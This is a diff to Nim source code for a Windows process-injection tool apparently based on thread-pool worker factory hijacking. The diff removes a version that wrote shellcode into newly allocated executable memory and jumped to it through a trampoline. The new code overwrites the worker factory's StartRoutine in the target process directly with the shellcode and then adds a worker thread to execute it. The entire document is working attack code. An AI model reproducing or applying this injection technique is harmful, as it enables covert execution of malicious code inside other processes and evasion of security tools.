@@ -33,25 +33,6 @@ var targetHandle = OpenProcess(
 
 var workerFactoryHandle = hijackProcessHandle(newWideCString("TpWorkerFactory"), targetHandle, WORKER_FACTORY_ALL_ACCESS)
 
-echo "Allocating + Writing shellcode"
-discard readLine(stdin)
-let rPtr = VirtualAllocEx(
-        targetHandle,
-        NULL,
-        cast[SIZE_T](shellcode.len),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READ_WRITE
-    )
-var bytesWritten: SIZE_T
-let wSuccess = WriteProcessMemory(
-    targetHandle, 
-    rPtr,
-    addr shellcode,
-    cast[SIZE_T](shellcode.len),
-    addr bytesWritten
-)
-echo "Shellcode address: " & $cast[int](rPtr).toHex
-
 var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
 NtQueryInformationWorkerFactory(
     workerFactoryHandle,
@@ -61,20 +42,12 @@ NtQueryInformationWorkerFactory(
     NULL
     )
 
-
-var jmp = 0xe9
-var trampoline: PBYTE
-copyMem(addr trampoline, addr jmp, 1)
-copyMem((addr trampoline) + 1, unsafeAddr rPtr, sizeof(LPVOID))
-
-echo "writing trampoline to " & $cast[int](WorkerFactoryInformation.StartRoutine).toHex
-discard readLine(stdin)
-WriteProcessMemory(
+let wSuccess = WriteProcessMemory(
     targetHandle, 
     WorkerFactoryInformation.StartRoutine,
-    addr trampoline,
-    sizeof(LPVOID) + 1,
-    addr bytesWritten
+    addr shellcode,
+    cast[SIZE_T](shellcode.len),
+    NULL
 )
 
 echo "Adding worker thread"
